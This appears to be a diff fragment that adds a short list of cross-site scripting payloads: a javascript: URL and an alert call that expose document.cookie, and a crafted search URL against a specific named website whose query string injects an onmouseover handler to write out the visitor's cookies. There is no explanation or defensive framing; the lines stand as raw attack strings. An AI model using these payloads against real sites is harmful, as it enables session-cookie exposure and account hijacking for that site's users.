@@ -1,0 +1,4 @@
+javascript:document.write(document.cookie)
+
+alert(document.cookie)
+http://www.jjkjzz.org.cn/site/search.php?search=%22%20onmouseover=document.write(document.cookie)%3E
